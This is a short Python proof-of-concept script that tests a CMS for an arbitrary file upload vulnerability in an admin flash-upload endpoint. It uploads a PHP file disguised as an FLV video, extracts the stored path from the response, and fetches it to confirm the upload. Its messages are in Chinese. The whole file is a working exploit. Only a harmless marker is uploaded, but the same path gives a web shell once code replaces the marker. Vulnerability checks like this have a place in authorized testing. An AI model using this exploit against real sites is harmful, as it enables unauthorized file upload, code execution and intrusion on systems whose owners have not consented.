#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()

def verify(site):
    path ="/cms/manage/admin.php?m=manage&c=background&a=action_flashUpload"
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'multipart/form-data; boundary=----123'
    }
    payload =f'''------123
Content-Disposition: form-data; name="filePath"; filename="test.php"
Content-Type: video/x-flv

vulntest
------123'''
    resq  = requests.post(url=site+path,headers=headers,data=payload,timeout=5,verify=False,allow_redirects=False)
    if resq.status_code == 302 and 'MAIN_URL_ROOT/upload/images' in resq.text:
        #正则匹配返回路径
        shell_path = '/cms/'+re.search('(?<=MAIN_URL_ROOT)(.*)(.php)', resq.text).group()
        resq_2  = requests.get(url=site+shell_path,timeout=5,verify=False)
        if "vulntest" in resq_2.text:
            return site+shell_path
    return ""


if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，文件上传后的路径为：", info)
    else:
        print("[-]漏洞不存在") 
